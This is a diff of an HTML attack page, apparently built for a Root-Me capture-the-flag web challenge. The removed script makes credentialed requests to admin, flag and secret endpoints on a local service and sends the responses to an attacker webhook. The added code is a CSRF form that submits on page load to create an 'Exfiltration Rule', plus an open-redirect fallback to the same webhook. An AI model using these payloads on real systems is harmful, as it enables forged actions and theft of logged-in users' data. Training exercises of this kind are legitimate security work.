@@ -1,38 +1,21 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Admin Access</title>
+    <title>CSRF Admin</title>
 </head>
-<body>
+<body onload="document.getElementById('adminForm').submit();">
+    <!-- Try to create a new rule that contains something we can use to exfiltrate data -->
+    <form id="adminForm" action="http://127.0.0.1:58039/api/rules" method="POST">
+        <input type="hidden" name="name" value="Exfiltration Rule">
+        <input type="hidden" name="description" value="This rule helps exfiltrate data">
+        <input type="hidden" name="redirect" value="http://challenge01.root-me.org:58039/redirect?url=https://iamevil.free.beeceptor.com/rule_created">
+    </form>
+    
+    <!-- Fallback redirect -->
     <script>
-        // Check potential admin endpoints
-        const endpoints = [
-            '/admin',
-            '/dashboard',
-            '/flags',
-            '/flag',
-            '/settings',
-            '/secret'
-        ];
-        
-        // Try each endpoint
-        endpoints.forEach(endpoint => {
-            fetch('http://127.0.0.1:58039' + endpoint, {
-                credentials: 'include'
-            })
-            .then(response => response.text())
-            .then(data => {
-                // Send the content to our webhook
-                fetch('https://iamevil.free.beeceptor.com/endpoint?path=' + encodeURIComponent(endpoint) + '&data=' + encodeURIComponent(data))
-                .catch(() => {});
-            })
-            .catch(() => {});
-        });
-        
-        // Ensure we get a redirect regardless
         setTimeout(() => {
-            window.location = 'http://challenge01.root-me.org:58039/redirect?url=https://iamevil.free.beeceptor.com/checked_admin_pages';
-        }, 2000);
+            window.location = 'http://challenge01.root-me.org:58039/redirect?url=https://iamevil.free.beeceptor.com/admin_form_timeout';
+        }, 1500);
     </script>
 </body>
 </html>
